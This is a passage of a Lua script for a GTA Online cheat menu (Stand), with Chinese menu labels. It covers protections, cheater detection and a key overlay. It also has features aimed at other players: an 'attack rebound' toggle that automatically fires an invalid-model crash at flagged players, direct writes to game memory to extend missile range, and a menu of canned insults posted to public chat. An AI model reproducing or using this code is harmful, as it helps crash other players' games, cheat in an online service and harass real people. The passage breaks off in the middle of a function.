    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped()) --获取目标位置
    GRAPHICS.REMOVE_PARTICLE_FX_IN_RANGE(pos.x, pos.y, pos.z, 30) --清除目标实体位置周围所有粒子特效
    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped()) --清除目标实体所有粒子特效
    end)
-------------------------------------
-- ANTICAGE
-------------------------------------
local cageModels <const> =
{
	"prop_gold_cont_01",
	"prop_gold_cont_01b",
	"prop_feeder1_cr",
	"prop_rub_cage01a",
	"stt_prop_stunt_tube_s",
	"stt_prop_stunt_tube_end",
	"prop_jetski_ramp_01",
	"stt_prop_stunt_tube_xs",
	"prop_fnclink_03e",
	"prop_container_05a",
	"prop_jetski_ramp_01",
    "prop_cs_dumpster_01a",
    "p_v_43_safe_s",
    "bkr_prop_moneypack_03a",
	"prop_elecbox_12"
}
local lastMsg = ""
local lastNotification <const> = newTimer()
local format = "笼子物体来自 %s"

menu.toggle_loop(protections, "反笼子", {"anticage"}, "请不要在任务中开启", function()
	local myPos = players.get_position(players.user())
	for _, model in ipairs(cageModels) do
		local modelHash <const> =  util.joaat(model)
		local obj = OBJECT.GET_CLOSEST_OBJECT_OF_TYPE(myPos.x,myPos.y,myPos.z, 8.0, modelHash, false, false, false)
		if obj == 0 or not ENTITY.DOES_ENTITY_EXIST(obj) or
		not ENTITY.IS_ENTITY_AT_ENTITY(players.user_ped(), obj, 5.0, 5.0, 5.0, false, true, 0) then
			continue
		end
		local ownerId = get_entity_owner(obj)
		local msg = string.format(format, get_condensed_player_name(ownerId))
		if ownerId ~= players.user() and is_player_active(ownerId, false, false) and
		(lastMsg ~= msg or lastNotification.elapsed() >= 15000) then
			notification(msg, HudColour.blueLight)
			lastMsg = msg
			lastNotification.reset()
		end
		request_control(obj, 1500)
		entities.delete_by_handle(obj)
	end
end)
	menu.toggle(protections, "阻止网络事件", {}, "阻止网络事件传输", function(on_toggle)
        local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
        local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
		if on_toggle then
			menu.trigger_command(BlockNetEvents)
			notification("已阻止所有网络传输", colors.green)
		else
			menu.trigger_command(UnblockNetEvents)
			notification("关闭阻止网络传输", colors.red)
		end
	end)

	menu.toggle(protections, "阻止传入", {}, "阻止网络事件传入", function(on_toggle)
        local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
        local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
		if on_toggle then
			menu.trigger_command(BlockIncSyncs)
			notification("开启阻止网络事件传入", colors.green)
		else
			menu.trigger_command(UnblockIncSyncs)
			notification("关闭阻止网络事件传入", colors.red)
		end
	end)
	menu.toggle(protections, "阻止传出", {}, "阻止网络事件传出", function(on_toggle)
		if on_toggle then
			notification("开启阻止网络事件传出", colors.green)
			menu.trigger_commands("desyncall on")
		else
			notification("关闭阻止网络事件传出", colors.red)
			menu.trigger_commands("desyncall off")
		end
	end)
	menu.toggle(protections, "防崩视角", {"acc"}, "", function(on_toggle)
		if on_toggle then
			notification("开启防崩视角", colors.green)
			menu.trigger_commands("anticrashcam on")
			menu.trigger_commands("potatomode on")
		else
			notification("关闭防崩视角", colors.red)
			menu.trigger_commands("anticrashcam off")
			menu.trigger_commands("potatomode off")
		end
	end)

	menu.toggle(protections, "自闭模式", {"panic"}, "没错就是自闭", function(on_toggle)
        local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
        local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
        local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
        local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
        if on_toggle then
            notification("开启自闭模式", colors.green)
            menu.trigger_commands("desyncall on")
            menu.trigger_command(BlockIncSyncs)
            menu.trigger_command(BlockNetEvents)
            menu.trigger_commands("anticrashcamera on")
        else
            notification("关闭自闭模式", colors.red)
            menu.trigger_commands("desyncall off")
            menu.trigger_command(UnblockIncSyncs)
            menu.trigger_command(UnblockNetEvents)
            menu.trigger_commands("anticrashcamera off")
        end
	end)
local gongjichaofeng = menu.list(protections, "攻击嘲讽", {}, "")
ridicule = menu.toggle(gongjichaofeng, "攻击嘲讽", {""}, "", function()
    cf = state
    _U_hack_list={}
    while cf do
        util.yield(0)
        for PlayerID=0,31 do
            if PlayerID~= PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID) then
                if players.is_marked_as_attacker(PlayerID,1 << 0x03) or players.is_marked_as_attacker(PlayerID,1 << 0x04) or players.is_marked_as_attacker(PlayerID,1 << 0x05) or players.is_marked_as_attacker(PlayerID,1 << 0x0C) or players.is_marked_as_attacker(PlayerID,1 << 0x0D) or players.is_marked_as_attacker(PlayerID,1 << 0x0E) then
                    if not _U_hack_list[PlayerID+1] then
                        chat.send_message(PLAYER.GET_PLAYER_NAME(PlayerID)..chaofeng.."\nRID:"..players.get_rockstar_id(PlayerID),false,true,true)
                        _U_hack_list[PlayerID+1]=true
                    end
                else
                    _U_hack_list[PlayerID+1]=false
                end
            end
        end
    end
end)
menu.set_value(ridicule, config_active5)
chaofengxiugai = filesystem.stand_dir().."\\Lua Scripts\\lib\\YeMulib"
menu.action(gongjichaofeng, "更改攻击嘲讽内容",{""}, "记事本打开文件夹中的YMchaofeng文件，编辑内容即可", function()
util.open_folder(chaofengxiugai)
end)
menu.toggle_loop(protections, "攻击反弹V1", {"crashrebound"}, "", function()
    for _, PlayerID in ipairs(players.list(false, true, true)) do
        if players.is_marked_as_attacker(PlayerID,1 << 0x03) or players.is_marked_as_attacker(PlayerID,1 << 0x04) or players.is_marked_as_attacker(PlayerID,1 << 0x05) or players.is_marked_as_attacker(PlayerID,1 << 0x0C) or players.is_marked_as_attacker(PlayerID,1 << 0x0D) or players.is_marked_as_attacker(PlayerID,1 << 0x0E) then
            menu.trigger_commands("nature") 
                break
            end
        end
end)
menu.toggle_loop(protections, "攻击反弹V2", {"crashrebound2"}, "", function()
    _U_hack_list={}
    while true do
        util.yield(0)
        for PlayerID=0,31 do
            if PlayerID~= PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID) then
                if players.is_marked_as_attacker(PlayerID,1 << 0x03) or players.is_marked_as_attacker(PlayerID,1 << 0x04) or players.is_marked_as_attacker(PlayerID,1 << 0x05) or players.is_marked_as_attacker(PlayerID,1 << 0x0C) or players.is_marked_as_attacker(PlayerID,1 << 0x0D) or players.is_marked_as_attacker(PlayerID,1 << 0x0E) then
                    if not _U_hack_list[PlayerID+1] then
                        menu.trigger_commands("invalidmodelcrash") 
                        _U_hack_list[PlayerID+1]=true
                    end
                else
                    _U_hack_list[PlayerID+1]=false
                end
            end
        end
    end
end)
menu.divider(protections, "玩家信息检测")
detection = menu.list(protections, "玩家检测", {}, "", function(); end)
menu.toggle(detection, "一键开启", {}, "", function(on)
    if on then
        menu.set_value(pin1,true)
        menu.set_value(pin2,true)
        menu.set_value(pin3,true)
        menu.set_value(pin4,true)
        menu.set_value(pin5,true)
        menu.set_value(pin6,true)
        menu.set_value(pin7,true)
        menu.set_value(pin8,true)
        menu.set_value(pin9,true)
        menu.set_value(pin10,true)
        menu.set_value(pin11,true)
        menu.set_value(pin12,true)
        menu.set_value(pin13,true)
    else
        menu.set_value(pin1,false)
        menu.set_value(pin2,false)
        menu.set_value(pin3,false)
        menu.set_value(pin4,false)
        menu.set_value(pin5,false)
        menu.set_value(pin6,false)
        menu.set_value(pin7,false)
        menu.set_value(pin8,false)
        menu.set_value(pin9,false)
        menu.set_value(pin10,false)
        menu.set_value(pin11,false)
        menu.set_value(pin12,false)
        menu.set_value(pin13,false)
    end
end)
local function BitTest(bits, place)
    return (bits & (1 << place)) ~= 0
end
local function IsPlayerUsingOrbitalCannon(player)
    return BitTest(memory.read_int(memory.script_global((2657589 + (player * 466 + 1) + 427))), 0) -- Global_2657589[PLAYER::PLAYER_ID() /*466*/].f_427), 0
end
local function get_interior_player_is_in(PlayerID)
    return memory.read_int(memory.script_global(((2657589 + 1) + (PlayerID * 466)) + 245)) -- Global_2657589[bVar0 /*466*/].f_245
end
local function get_spawn_state(PlayerID)
    return memory.read_int(memory.script_global(((2657589 + 1) + (PlayerID * 466)) + 232)) -- Global_2657589[PLAYER::PLAYER_ID() /*466*/].f_232
end
menu.divider(detection,"检测列表")  
pin1 = menu.toggle_loop(detection, "无敌模式", {}, "检测战局玩家是否在使用无敌.", function()
    for _, PlayerID in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        for _, id in ipairs(interior_stuff) do
            if players.is_godmode(PlayerID) and not players.is_in_interior(PlayerID) and not NETWORK.NETWORK_IS_PLAYER_FADING(PlayerID) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_spawn_state(PlayerID) == 99 and get_interior_player_is_in(PlayerID) == id then
                util.draw_debug_text(players.get_name(PlayerID) .. "是无敌,很有可能是作弊者")
                break
            end
        end
    end 
end)
pin2 = menu.toggle_loop(detection, "载具无敌模式", {}, "检测玩家载具是否在使用无敌.", function()
    for _, PlayerID in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local driver = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1))
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            for _, id in ipairs(interior_stuff) do
                if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(vehicle) and not NETWORK.NETWORK_IS_PLAYER_FADING(PlayerID) and ENTITY.IS_ENTITY_VISIBLE(ped) 
                and get_spawn_state(PlayerID) == 99 and get_interior_player_is_in(PlayerID) == id and PlayerID == driver then
                    util.draw_debug_text(players.get_name(driver) .. "的载具处于无敌模式")
                    break
                end
            end
        end
    end 
end)
pin3 = menu.toggle_loop(detection, "未发布的载具", {}, "检测是否有玩家在驾驶尚未发布的载具.", function()
    for _, PlayerID in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(PlayerID)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local driver = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1))
        for i, name in ipairs(unreleased_vehicles) do
            if modelHash == util.joaat(name) and PED.IS_PED_IN_ANY_VEHICLE(ped, false) and PlayerID == driver then
                util.draw_debug_text(players.get_name(driver) .. " 正在驾驶未发布载具 " .. "(" .. name .. ")")
            end
        end
    end
end)
pin4 = menu.toggle_loop(detection, "作弊武器", {}, "检测是否有玩家使用无法获得的武器.", function()
    for _, PlayerID in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        for i, hash in ipairs(modded_weapons) do
            local weapon_hash = util.joaat(hash)
            if WEAPON.HAS_PED_GOT_WEAPON(ped, weapon_hash, false) and (WEAPON.IS_PED_ARMED(ped, 7) or TASK.GET_IS_TASK_ACTIVE(ped, 8) or TASK.GET_IS_TASK_ACTIVE(ped, 9)) then
                util.toast(players.get_name(PlayerID) .. " 使用隐藏的武器 " .. "(" .. hash .. ")")
                break
            end
        end
    end
end)
pin5 = menu.toggle_loop(detection, "作弊载具", {}, "检测是否有玩家正在使用无法获得的载具.", function()
    for _, PlayerID in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local modelHash = players.get_vehicle_model(PlayerID)
        local driver = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1))
        for i, name in ipairs(modded_vehicles) do
            if modelHash == util.joaat(name) and PlayerID == driver then
                util.draw_debug_text(players.get_name(driver) .. " Is Driving A Modded Vehicle " .. "(" .. name .. ")")
                break
            end
        end
    end
end)
pin6 = menu.toggle_loop(detection, "自由镜头检测", {}, "检测是否有玩家使用自由镜头(又称无碰撞)", function()
    for _, PlayerID in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local ped_ptr = entities.handle_to_pointer(ped)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local oldpos = players.get_position(PlayerID)
        util.yield()
        local currentpos = players.get_position(PlayerID)
        local vel = ENTITY.GET_ENTITY_VELOCITY(ped)
        if not util.is_session_transition_active() and players.exists(PlayerID)
        and get_interior_player_is_in(PlayerID) == 0 and get_spawn_state(PlayerID) ~= 0
        and not PED.IS_PED_IN_ANY_VEHICLE(ped, false) -- 当玩家开车时有很多误报,所以去他妈的.
        and not NETWORK.NETWORK_IS_PLAYER_FADING(PlayerID) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped)
        and not PED.IS_PED_CLIMBING(ped) and not PED.IS_PED_VAULTING(ped) and not PED.IS_PED_USING_SCENARIO(ped)
        and not TASK.GET_IS_TASK_ACTIVE(ped, 160) and not TASK.GET_IS_TASK_ACTIVE(ped, 2)
        and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(PlayerID)) <= 395.0 --如果数值为 400 会导致误报
        and ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(ped) > 5.0 and not ENTITY.IS_ENTITY_IN_AIR(ped) and entities.player_info_get_game_state(ped_ptr) == 0
        and oldpos.x ~= currentpos.x and oldpos.y ~= currentpos.y and oldpos.z ~= currentpos.z 
        and vel.x == 0.0 and vel.y == 0.0 and vel.z == 0.0 then
            util.toast(players.get_name(PlayerID) .. " 是无碰撞")
            break
        end
    end
end)
pin7 = menu.toggle_loop(detection, "超级驾驶检测", {}, "检测是否有玩家在修改载具速度", function()
    for _, PlayerID in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local veh_speed = (ENTITY.GET_ENTITY_SPEED(vehicle)* 2.236936)
        local class = VEHICLE.GET_VEHICLE_CLASS(vehicle)
        local driver = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1))
        if class ~= 15 and class ~= 16 and veh_speed >= 200 and (players.get_vehicle_model(PlayerID) ~= util.joaat("oppressor") and players.get_vehicle_model(PlayerID) ~= util.joaat("oppressor2")) and PlayerID == driver then
            util.toast(players.get_name(driver) .. " 正在使用超级驾驶")
            break
        end
    end
end)
pin8 = menu.toggle_loop(detection, "观看检测", {}, "检测是否有玩家在观看你.", function()
    for _, PlayerID in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        if not PED.IS_PED_DEAD_OR_DYING(ped) and not NETWORK.NETWORK_IS_PLAYER_FADING(PlayerID) then
            if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_cam_pos(PlayerID)) < 15.0 and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(PlayerID)) > 50.0 then
                util.toast(players.get_name(PlayerID) .. " 正在观看你")
                break
            end
        end
    end
end)
pin9 = menu.toggle_loop(detection, "雷霆加入检测", {}, "检测是否有玩家使用了雷霆加入.", function()
    for _, PlayerID in ipairs(players.list(false, true, true)) do
        if get_spawn_state(players.user()) == 0 then return end
        local old_sh = players.get_script_host()
        util.yield(100)
        local new_sh = players.get_script_host()
        if old_sh ~= new_sh then
            if get_spawn_state(PlayerID) == 0 and players.get_script_host() == PlayerID then
                util.toast(players.get_name(PlayerID) .. " 触发了雷霆加入检测，现在被归类为作弊者")
            end
        end
    end
end)
pin10 = menu.toggle_loop(detection, "修改后的天基炮", {}, "检测是否有人在使用修改过的天基炮.", function()
    for _, PlayerID in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        if IsPlayerUsingOrbitalCannon(PlayerID) and not TASK.GET_IS_TASK_ACTIVE(ped, 135) then
            util.toast(players.get_name(PlayerID) .. " 正在使用修改过的天基炮")
        end
    end
end)
pin11 = menu.toggle_loop(detection, "传送检测", {}, "", function()
    for _, PlayerID in ipairs(players.list(true, true, true)) do
        local old_pos = players.get_position(PlayerID)
        util.yield(50)
        local cur_pos = players.get_position(PlayerID)
        local distance_between_tp = v3.distance(old_pos, cur_pos)
        for _, id in ipairs(interior_stuff) do
            if get_interior_player_is_in(PlayerID) == id and get_spawn_state(PlayerID) ~= 0 and players.exists(PlayerID) then
                util.yield(100)
                if distance_between_tp > 300.0 then
                    util.toast(players.get_name(PlayerID) .. " 传送到 " .. SYSTEM.ROUND(distance_between_tp) .. " 米")
                end
            end
        end
    end
end)
pin12 = menu.toggle_loop(detection, "天基炮", {}, "检测是否有人在使用天基炮.", function()
    for _, PlayerID in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        if IsPlayerUsingOrbitalCannon(PlayerID) and TASK.GET_IS_TASK_ACTIVE(ped, 135) then
            util.draw_debug_text(players.get_name(PlayerID) .. " 是在轨道炮处")
        end
    end
end)
pin13 = menu.toggle_loop(detection, "狗屎无敌模式检测", {}, "检测是否有人通过触发某种突发事件来获得无敌模式.\n这是一个哪怕绿玩也可以卡出来的垃圾无敌", function()
    for _, PlayerID in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false) 
        local height = ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(ped)
        for _, id in ipairs(interior_stuff) do
            if players.is_in_interior(PlayerID) and players.is_godmode(PlayerID) and not NETWORK.NETWORK_IS_PLAYER_FADING(PlayerID) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_spawn_state(PlayerID) == 99 and get_interior_player_is_in(PlayerID) == id then
                util.draw_debug_text(players.get_name(PlayerID) .. " 正在使用Bug卡出来的垃圾无敌")
                break
            end
        end
    end 
end)
local misc = menu.list(YM_root, "其它选项", {}, "")
menu.action(misc, "重新启动游戏", {}, "", function(on_click)
    MISC._RESTART_GAME()
end)
zhuti = menu.list(misc,"主题变色", {},"炒鸡炫酷！~")
zhutibianse = menu.action(zhuti, "加载主题选项", {""}, "", function()
        notification("正在加载主题选项,请稍等...",colors.blue)
        util.yield(2000)
        require "lib.YeMulib.YMPulsive"
        menu.delete(zhutibianse)
    end)
function newColor(R, G, B, A)
    return {r = R, g = G, b = B, a = A}
end
local run = true
local x, y = directx.get_client_size()
local ratio = x/y
local size = 0.03
local boxMargin = size / 7
local overlay_x = 0.0400
local overlay_y = 0.1850
local key_text_color = newColor(1, 1, 1, 1)
local background_colour = newColor(0, 0, 0, 0.2)
local pressed_background_colour = newColor(2.55/255, 2.55/255, 2.55/255, 0.5490196078431373)
local spaceBarLength = 3
local spaceBarSlim = 1
local altSpaceBar = 0
VT = menu.list(misc, "按键显示", {}, "", function(); 
end)
VT1 =menu.toggle(VT, '按键开关', {'anjian'}, '', function(off) 
	run = off
end, true)
menu.slider(VT, 'X轴坐标', {'x-position'}, '',1 , 10000, overlay_x * 10000, 1, function(value)
	overlay_x = value / 10000
end)
menu.slider(VT, 'Y轴坐标', {'y-position'}, '',1 , 10000, overlay_y * 10000, 1, function(value)
	overlay_y = value / 10000
end)
menu.slider(VT, '尺寸', {'size'}, '',1 , 10000, 300, 1, function(value)
	size = value / 10000
    boxMargin = size / 7
end)
local hideKey = false
menu.toggle(VT, '隐藏按键文本', {'hide-text'}, '', function(toggle)
    hideKey = toggle
end)
local hide_root = menu.list(VT, '隐藏按键', {''}, '')
for i = 1, #wasd do
    menu.toggle(hide_root, wasd[i].key, {}, '', function(toggle)
        wasd[i].show = not toggle
    end)
end
menu.toggle(VT, '短空格键', {'short-space'}, '', function(toggle)
    if toggle then
        spaceBarLength = 2
    else
        spaceBarLength = 3
    end
end)
menu.toggle(VT, '窄空格键', {'slim-space'}, '', function(toggle)
    if toggle then
        spaceBarSlim = 2
    else
        spaceBarSlim = 1
    end
end)
local center_space_toggle center_space_toggle = menu.toggle(VT, '中间空格键', {'alt-space'}, '使空格在 A、S、D 下居中。这需要shift和ctrl关闭.', function(toggle)
    if altShiftCtrl and (wasd[10].show or wasd[9].show) then
        altSpaceBar = 1
        return
    end
    if toggle then
        altSpaceBar = 0
    else
        altSpaceBar = 1
    end
end, true)
menu.toggle(VT, '窄 shift和ctrl键', {'slim-shift-ctrl'}, '', function(toggle)
    altShiftCtrl = toggle
    if toggle and menu.get_value(center_space_toggle) == 1 then
        menu.trigger_command(center_space_toggle, 'off')
    else
        menu.trigger_command(center_space_toggle, 'on')
    end
end)
util.create_tick_handler(function()
    if run then
        for i = 1, #wasd do
            wasd[i].pressed = false
            for j = 1, #wasd[i].keys do
                if PAD.IS_CONTROL_PRESSED(2, wasd[i].keys[j]) then
                    wasd[i].pressed = true
                end
            end
        end
        for i = 1, #wasd - 3 do
            if wasd[i].show then
                directx.draw_rect(overlay_x + (boxMargin + size) * (i > 4 and i - 5 or i - 1), overlay_y + (i > 4 and (boxMargin + size * ratio) or 0)* 1.05, size, size * ratio, wasd[i].pressed and pressed_background_colour or background_colour)
                if not hideKey then
                    directx.draw_text(overlay_x + (boxMargin + size) * (i > 4 and i - 5 or i - 1)+ size * 0.45,(i > 4 and  overlay_y + (boxMargin + size * ratio)* 1.2 or  overlay_y*1.07) , wasd[i].key, 1, size *20, key_text_color, false)
                end
            end
        end
        if altShiftCtrl then
            if wasd[#wasd - 2].show then
                directx.draw_rect(overlay_x, overlay_y + (boxMargin + size)* ratio * 2,(boxMargin + size) - boxMargin, size * ratio / 2, wasd[#wasd - 2].pressed and pressed_background_colour or background_colour)
            end
            if wasd[#wasd - 1].show then
                directx.draw_rect(overlay_x, overlay_y + (boxMargin + size)* ratio * 2.5,(boxMargin + size) - boxMargin, size * ratio / 2, wasd[#wasd - 1].pressed and pressed_background_colour or background_colour)
            end
        else
            for i = 9, 10 do
                if wasd[i].show then
                directx.draw_rect(overlay_x - (boxMargin + size), overlay_y + (boxMargin + size * ratio) * (i - 8) * 1.05, size, size * ratio, wasd[i].pressed and pressed_background_colour or background_colour)
                if not hideKey then
                    directx.draw_text(overlay_x - (boxMargin + size)+ size * 0.45,(i > 4 and  overlay_y + (boxMargin + size * ratio) * (i - 8)* 1.2 or  overlay_y*1.07) , wasd[i].key, 1, size *20, key_text_color, false)
                end
                end
            end
        end
        if wasd[#wasd].show then
            directx.draw_rect(overlay_x + (boxMargin + size) * altSpaceBar, overlay_y + (boxMargin + size)* ratio * 2,(boxMargin + size) * spaceBarLength - boxMargin, size * ratio / spaceBarSlim, wasd[#wasd].pressed and pressed_background_colour or background_colour)
        end
	end
end)
menu.set_value(VT1, false)
menu.action(online, '雪球大战', {}, '给战局中的每个人雪球并通过文字通知它们', function ()
    local plist = players.list()
    local snowballs = util.joaat('WEAPON_SNOWBALL')
    for i = 1, #plist do
        local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(plist[i])
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(plyr, snowballs, 20, true)
        WEAPON.SET_PED_AMMO(plyr, snowballs, 20)
         notification("你获得了雪球！", colors.black)
        util.yield()
    end
end)
menu.action(online, '玩家暴乱', {}, '给战局中的每个人提供烟花发射器并通过文字通知它们', function ()
    local plist = players.list()
    local fireworks = util.joaat('weapon_firework')
    for i = 1, #plist do
        local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(plist[i])
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(plyr, fireworks, 20, true)
        WEAPON.SET_PED_AMMO(plyr, fireworks, 20)
        players.send_sms(plist[i], players.user(), '暴乱时刻到!你获得了烟花')
        util.yield()
    end
end)
menu.toggle_loop(online, '富得掉钱', {}, '走过路过都是钱~', function ()
    local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    local tar1 = ENTITY.GET_ENTITY_COORDS(players.user_ped(), true)
    Streamptfx('scr_exec_ambient_fm')
    if TASK.IS_PED_WALKING(targets) or TASK.IS_PED_RUNNING(targets) or TASK.IS_PED_SPRINTING(targets) then
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD('scr_ped_foot_banknotes', tar1.x, tar1.y, tar1.z - 1, 0, 9, 0, 1.0, true, true, true)
    end    
end)
menu.action(online, '停止观看', {'sspect'}, '停止在战局里观看任何人', function ()
    Specon(players.user())
    Specoff(players.user())
end)
menu.toggle_loop(online, '增加虎鲸导向导弹射程', {'krange'}, '你可在地图的任何地方使用', function ()
    if util.is_session_started() then
    memory.write_float(memory.script_global(262145 + 30176), 200000.0)
    end
end)
local onlinechats = menu.list(fanyiyuyan, "快捷聊天", {}, "含语言反击")
menu.action(onlinechats, "价值观", {}, "", function()
   chat.send_message("富强、民主、文明、和谐，自由、平等、公正、法治，爱国、敬业、诚信、友善。", false, true, true)
end)
menu.action(onlinechats, "中国台湾", {}, "", function()
   chat.send_message("世界上只有一个中国，坚持一个中国原则，台湾是中国领土不可分割的一部分！", false, true, true)
   chat.send_message("There is only one China in the world, the one-China principle is upheld, and Taiwan is an inalienable part of China's territory!", false, true, true)
end)
menu.action(onlinechats, "夜幕LUA", {}, "", function()
   chat.send_message("我爱夜幕，夜幕牛逼，夜幕666！", false, true, true)
 end)
taunt = menu.list(onlinechats, "语言反击", {}, "理智骂人")
tauntfolder = filesystem.stand_dir().."\\Lua Scripts\\lib\\YeMulib"
menu.action(taunt, "更改语言反击内容",{""}, "记事本打开文件夹中的YMcu文件，编辑内容即可", function()
util.open_folder(tauntfolder)
end)
menu.readonly(taunt, "感谢语言反击内容提供者", "空城~旧梦")
    menu.divider(taunt, "战局语言反击")
    menu.action(taunt, "玩你妈游戏", {""}, "公屏上骂他", function()
        chat.send_message(cussing16,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(taunt, "废物狗叫", {""}, "公屏上骂他", function()
        chat.send_message(cussing17,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(taunt, "被攻击给予警告", {""}, "公屏上骂他", function()
        chat.send_message(cussing18,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(taunt, "别惹我", {""}, "公屏上骂他", function()
        chat.send_message(cussing19,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(taunt, "劝挂", {""}, "公屏上骂他", function()
        chat.send_message(cussing20,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(taunt, "xp高处不胜寒", {""}, "公屏上骂他", function()
        chat.send_message(cussing21,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(taunt, "xp接管战局", {""}, "公屏上骂他", function()
        chat.send_message(cussing22,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(taunt, "xp嘲讽", {""}, "公屏上骂他", function()
        chat.send_message(cussing23,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(taunt, "xp被崩溃嘲讽", {""}, "公屏上骂他", function()
        chat.send_message(cussing24,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(taunt, "被崩溃嘲讽", {""}, "公屏上骂他", function()
        chat.send_message(cussing25,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(taunt, "崩溃辱骂", {""}, "公屏上骂他", function()
        chat.send_message(cussing26,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(taunt, "挂壁我鲨了你", {""}, "公屏上骂他", function()
        chat.send_message(cussing27,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(taunt, "骂没事找事的废物", {""}, "公屏上骂他", function()
        chat.send_message(cussing28,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(taunt, "骂他打字慢", {""}, "公屏上骂他", function()
        chat.send_message(cussing29,false,true,true)
    end)
taunt1 = menu.list(taunt, "对骂攻击", {}, "理智对骂")
    require("lib/YeMulib/YMcu")
    menu.action(taunt1, "对骂1", {""}, "公屏上骂他", function()
        chat.send_message(cussing30,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(taunt1, "对骂2", {""}, "公屏上骂他", function()
        chat.send_message(cussing31,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(taunt1, "对骂3", {""}, "公屏上骂他", function()
        chat.send_message(cussing32,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(taunt1, "对骂4", {""}, "公屏上骂他", function()
        chat.send_message(cussing33,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(taunt1, "对骂5", {""}, "公屏上骂他", function()
        chat.send_message(cussing34,false,true,true)
    end)
    require("lib/YeMulib/YMcu")
    menu.action(taunt1, "对骂6", {""}, "公屏上骂他", function()
